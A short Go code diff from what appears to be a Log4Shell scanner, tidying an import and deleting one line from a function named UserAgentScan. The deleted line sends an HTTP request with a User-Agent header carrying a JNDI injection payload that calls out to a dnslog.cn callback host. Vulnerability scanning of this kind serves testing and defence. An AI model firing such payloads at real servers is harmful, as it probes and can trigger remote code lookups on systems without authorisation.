@@ -2,7 +2,7 @@ package main
 
 import (
 	"bufio"
-	flag "flag"
+	"flag"
 	"fmt"
 	"io"
 	"log"
@@ -216,8 +216,6 @@ func UserAgentScan(domain string, session string, url string)  {
 			os.Exit(0)
 		}
 	}
-
-	PayloadGetHttp(url, "User-Agent", "Mozilla/1.22 (compatible; MSIE 2.0d; Windows NT)${jndi:dns://vuaynl.dnslog.cn}")
 }
 
 func main()  {
